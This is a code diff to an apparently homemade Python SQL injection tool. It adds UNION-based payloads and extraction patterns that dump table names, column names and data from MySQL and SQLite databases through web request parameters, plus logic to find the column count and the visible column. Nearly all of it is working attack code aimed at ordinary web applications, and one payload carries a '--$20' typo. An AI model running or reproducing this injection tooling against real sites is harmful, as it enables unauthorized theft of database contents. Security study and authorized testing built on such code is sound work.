@@ -4,7 +4,7 @@ import argparse
 import re
 
 
-# ----------------------- #
+# --------- PATTERNS --------- #
 boolean_detection = {
 	"' AND '1'='1'--%20" : "' AND '1'='2'--%20",
 	"' AND '1'='2'--%20" : "' AND '1'='1'--%20",
@@ -51,7 +51,39 @@ error_patterns = {
 		"misuse of aggregate"
 	]
 }
+
+extraction_patterns = {
+	"mysql": {
+		"table_names": {
+			"key": "table_name",
+			"from": "FROM information_schema.tables--%20"
+		},
+		"column_names": {
+			"key": "column_name",
+			"from": "FROM information_schema.columns WHERE table_name='$TABLE_NAME'--$20"
+		},
+		"data_dump": {
+			"key": "$COLUMN_NAME",
+			"from": "FROM $TABLE_NAME--%20"
+		}
+	},
+	"sqlite": {
+		"table_names": {
+			"key": "name",
+			"from": "FROM sqlite_master WHERE type='table'--%20"
+		},
+		"column_names": {
+			"key": "sql",
+			"from": "FROM sqlite_master WHERE type='table' AND name='$TABLE_NAME'--%20"
+		},
+		"data_dump": {
+			"key": "$COLUMN_NAME",
+			"from": "FROM $TABLE_NAME--%20"
+		}
+	}
+}
 # ----------------------- #
+
 
 
 # --------- PRINTS --------- #
@@ -256,7 +288,7 @@ def get_injection_points(records: list[dict]) -> tuple[set, str | None]:
 
 
 
-# --------- EXTRACTION --------- #
+# --------- EXTRACTION STRUCTURE --------- #
 def get_select_size(injection_point: str, db_type: str, method, url, headers, body, default_request: dict) -> int | None:
     original_query_params = query_params(extract_query_string(url))
     original_body_params = body_params(body)
@@ -279,8 +311,48 @@ def get_select_size(injection_point: str, db_type: str, method, url, headers, bo
             record = request_record(method, url, headers, body_string_modified, injection_point, "extraction", payload)
             if any(re.search(pattern, record["response"]["content"], re.IGNORECASE) for pattern in error_patterns[db_type.lower()]):
                 return i - 1
-
     return None
+
+def get_pattern_strings(list : int) -> list[str]:
+    return [f"'{chr(97 + i) * 5}'" for i in list]
+
+def get_control_strings(list : int) -> list[str]:
+    return [f"{chr(97 + i) * 5}" for i in list]
+
+def get_visible_index(injection_point: str, db_type: str, method, url, headers, body, default_request: dict, select_size: int) -> int | None:
+	original_query_params = query_params(extract_query_string(url))
+	original_body_params = body_params(body)
+	control_strings = get_pattern_strings([i for i in range(select_size)])
+	union_select = f"' UNION SELECT " + ", ".join(control_strings) + f" --%20"
+
+	if injection_point in original_query_params:
+		original_query_params[injection_point] += union_select
+	elif injection_point in original_body_params:
+		original_body_params[injection_point] += union_select
+
+	record = request_record(method, assemble_full_url(extract_base_url(url), query_string(original_query_params)), headers,
+			body_string(original_body_params), injection_point, "extraction", union_select)
+
+	
+	diff = only_new_content(default_request["response"]["content"], record["response"]["content"])
+	
+	control_strings = get_control_strings([i for i in range(select_size)])
+	for i in range(len(control_strings)):
+		if control_strings[i] in diff:
+			return i
+	return None
+
+def get_pattern_union(select_size: int, visible_index: int, key : str, from_value : str) -> str:
+	pattern = [key if i is visible_index else "null" for i in range (select_size)]
+	print(pattern)
+	pattern_union = str()
+	for i in range(len(pattern)):
+		if i < len(pattern) - 1:
+			pattern_union += f"{pattern[i]}, "
+		else:
+			pattern_union += f"{pattern[i]} "
+
+	return f"' UNION SELECT " + pattern_union + from_value
 # ----------------------- #
 
 
@@ -310,10 +382,16 @@ def main():
 
 			print(f"[+] Attempting to determine the number of columns for injection point '{injection_point}'...")
 			num_columns = get_select_size(injection_point, db_type, method, url, headers, body, records["default"])
-			if num_columns:
-				print(f"[+] Number of columns determined: {num_columns}\n")
-			else:
+			if num_columns is None:
 				print(f"[-] Could not determine the number of columns for injection point '{injection_point}'.\n")
+				continue
+			
+			visible_index = get_visible_index(injection_point, db_type, method, url, headers, body, records["default"], num_columns)
+			if visible_index is None:
+				print(f"[-] Could not determine the visible index for injection point '{injection_point}'.\n")
+				continue
+
+			print(get_pattern_union(num_columns, visible_index, extraction_patterns["mysql"]["table_names"]["key"], extraction_patterns["mysql"]["table_names"]["from"]))
 
 	except requests.RequestException as e:
 		print("[!] An error occurred while making the requests:", e)
